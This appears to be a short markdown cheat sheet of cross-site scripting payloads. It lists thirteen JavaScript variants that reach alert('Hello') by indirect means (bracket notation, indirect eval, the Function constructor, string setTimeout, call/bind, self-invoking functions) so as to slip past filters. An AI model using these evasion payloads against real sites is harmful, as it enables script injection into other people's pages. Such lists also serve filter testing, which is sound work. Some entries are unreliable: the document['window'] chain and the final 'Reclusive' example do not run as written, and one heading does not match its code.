# XSS_Payloads2

XSS payloads

## Array Notation  
```js
window['alert']('Hello');```


## Chained Array Notation  
```js
this['window']['alert']('Hello');```


## Indirect Reference Using Call/Apply  
```js
(0, eval)('alert("Hello")');```


## Calling via Function Constructor  
```js
(new Function('alert("Hello")'))();```


## SetTimeout or SetInterval  
```js
setTimeout('alert("Hello")', 0);```


## Indirect Reference with call  
```js
window.alert.call(this, 'Hello');```


## Using bind  
```js
const alertBind = alert.bind(window);
alertBind('Hello');```


## anon functions  
```js
(() => alert('Hello'))();```


## Self-Invoking Function with alert  
```js
(function(){ alert('Hello'); })();```


## Function call  
```js
Function.prototype.call.call(alert, window, 'Hello');```


## Global this  
```js
(this || window).alert('Hello');```


## chaining doc and window  
```js
document['window']['alert']('Hello');```


## Reclusive indirect function calling  
```js
(((f) => f(f))((f) => alert('Hello')))();```

